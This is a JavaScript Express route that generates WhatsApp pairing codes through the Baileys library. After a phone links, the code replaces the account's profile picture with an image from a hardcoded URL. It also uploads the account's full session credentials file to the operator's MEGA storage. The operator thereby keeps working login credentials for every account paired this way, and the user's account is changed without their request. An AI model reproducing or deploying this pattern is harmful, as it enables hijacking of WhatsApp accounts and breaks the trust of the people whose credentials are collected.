import express from "express";
import fs from "fs";
import axios from "axios";
import pino from "pino";
import pn from "awesome-phonenumber";
import {
  makeWASocket,
  useMultiFileAuthState,
  delay,
  makeCacheableSignalKeyStore,
  Browsers,
  jidNormalizedUser,
  fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import { upload } from "./mega.js";

const router = express.Router();

/* -------------------- helpers -------------------- */

function removeFile(path) {
  try {
    if (fs.existsSync(path)) {
      fs.rmSync(path, { recursive: true, force: true });
    }
  } catch {}
}

async function getImageBuffer(url) {
  const res = await axios.get(url, { responseType: "arraybuffer" });
  return Buffer.from(res.data);
}

function getMegaFileId(url) {
  const match = url?.match(/\/file\/([^#]+#[^\/]+)/);
  return match ? match[1] : null;
}

/* -------------------- route -------------------- */

router.get("/", async (req, res) => {
  let num = req.query.number;
  if (!num) {
    return res.status(400).send({ code: "Number required" });
  }

  num = num.replace(/[^0-9]/g, "");
  const phone = pn("+" + num);
  if (!phone.isValid()) {
    return res.status(400).send({
      code: "Invalid phone number (use full international number)",
    });
  }

  num = phone.getNumber("e164").replace("+", "");
  const sessionDir = "./" + num;

  removeFile(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  let dpDone = false;
  let pairSent = false;

  const sock = makeWASocket({
    version,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(
        state.keys,
        pino({ level: "fatal" })
      ),
    },
    logger: pino({ level: "fatal" }),
    browser: Browsers.windows("Chrome"),
    printQRInTerminal: false,
    markOnlineOnConnect: false,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    /* ---------- pair complete ---------- */
    if (connection === "open" && !dpDone) {
      dpDone = true;
      console.log("✅ Pair completed");

      try {
        await delay(3000);

        // 🔹 DP image URL
        const imgUrl = "https://files.catbox.moe/d8z5wt.jpg";
        const imgBuffer = await getImageBuffer(imgUrl);

        // 🔹 set DP
        await sock.updateProfilePicture(sock.user.id, imgBuffer);

        // 🔔 notification
        await sock.sendMessage(sock.user.id, {
          text: "🖼️ Profile picture updated successfully ✅",
        });

        console.log("✅ DP set & notification sent");

        // 🔹 upload creds to MEGA
        const credsPath = sessionDir + "/creds.json";
        const megaUrl = await upload(
          credsPath,
          `creds_${num}_${Date.now()}.json`
        );

        const fileId = getMegaFileId(megaUrl);
        if (fileId) {
          const jid = jidNormalizedUser(num + "@s.whatsapp.net");
          await sock.sendMessage(jid, { text: fileId });
        }

        await delay(2000);
        removeFile(sessionDir);
        console.log("🧹 Session cleaned");

      } catch (e) {
        console.log("❌ Error after pair:", e.message);
      }
    }

    /* ---------- reconnect ---------- */
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== 401) {
        console.log("🔁 Reconnecting...");
      }
    }
  });

  /* ---------- request pairing code ---------- */
  if (!sock.authState.creds.registered) {
    await delay(3000);
    try {
      let code = await sock.requestPairingCode(num);
      code = code?.match(/.{1,4}/g)?.join("-") || code;

      if (!pairSent && !res.headersSent) {
        pairSent = true;
        res.send({ code });
      }
    } catch (e) {
      if (!res.headersSent) {
        res.status(503).send({
          code: "Failed to get pairing code",
        });
      }
    }
  }
});

export default router;

/* -------------------- safety -------------------- */

process.on("uncaughtException", (err) => {
  const e = String(err);
  if (
    e.includes("conflict") ||
    e.includes("not-authorized") ||
    e.includes("Timed Out") ||
    e.includes("rate-overlimit")
  )
    return;
  console.log("Unhandled:", err);
});
